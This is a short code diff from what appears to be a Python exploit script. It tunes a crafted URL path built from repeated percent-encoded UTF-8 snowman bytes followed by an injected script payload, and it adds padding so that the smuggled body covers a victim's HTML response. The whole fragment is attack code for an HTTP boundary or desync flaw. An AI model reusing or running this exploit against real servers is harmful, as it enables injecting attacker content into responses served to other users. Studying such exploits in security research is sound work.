@@ -102,8 +102,10 @@ def main() -> int:
                 # Start at the second byte of the UTF-8 snowman. This matches
                 # the successful raw-body boundary observed in the core test
                 # (the B body began with 98 83), while leaving the HTML marker
-                # immediately after that harmless leftover prefix.
-                after = 2 * before - len(script) - 1
+                # immediately after that harmless leftover prefix. Add a
+                # long ordinary body tail so it can cover the victim's small
+                # HTML response instead of stopping after 168 bytes.
+                after = 2 * before - len(script) - 1 + 300
                 path = (
                     "/missing/" + "%E2%98%83" * before
                     + "%E2%98%83" + quote_from_bytes(script, safe=b"")
